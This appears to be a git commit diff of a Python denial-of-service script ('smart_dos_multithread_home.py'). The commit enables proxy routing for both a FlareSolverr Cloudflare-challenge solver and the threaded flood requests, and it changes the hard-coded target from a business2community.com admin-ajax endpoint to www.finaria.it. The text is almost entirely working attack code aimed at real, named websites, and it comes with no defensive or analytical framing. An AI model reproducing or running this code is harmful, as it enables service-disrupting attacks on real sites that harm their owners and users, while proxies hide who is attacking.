b115e55bfbf7789a4cc99fd98cc405740e2848a2
blabla <heyholetsgo4@protonmail.com>
2023-01-24 23:45:23 +0200

    'a'

--- smart_dos_multithread_home.py
+++ smart_dos_multithread_home.py
@@ -61,7 +61,7 @@ def solveChanellnge(url):
 			data = {"cmd": "request.get",
 					"url": url,
 					"returnOnlyCookies": True,
-					#'proxy': {'url': PROXY_URL},
+					'proxy': {'url': PROXY_URL},
 					"maxTimeout": 30000  
 					}
 			resStr = requests.post(flareSolverUrl, json=data).content
@@ -114,7 +114,7 @@ def attackUrlCF(baseUrl, threadNumber):
 
 			requestsArr = []
 			for x in range(1):
-				requestsArr.append(grequests.get(url, headers=headers))#, proxies=proxies))
+				requestsArr.append(grequests.get(url, headers=headers, proxies=proxies))
 			#res = requests.post(url, headers=headers, proxies=proxies, data=postData.replace('REPLACE', str(random.randint(0,99999))))
 			res = grequests.map(requestsArr, exception_handler=my_handler)
 			isClear = True
@@ -145,7 +145,7 @@ def attackAll():
 flareSolverUrl = 'http://localhost:8191/v1'
 
 for i in range(1):
-	Thread(target=attackUrlCF, args=['https://www.business2community.com/wp-admin/admin-ajax.php', i]).start()
+	Thread(target=attackUrlCF, args=['https://www.finaria.it', i]).start()
 	time.sleep(30)
 input()
 
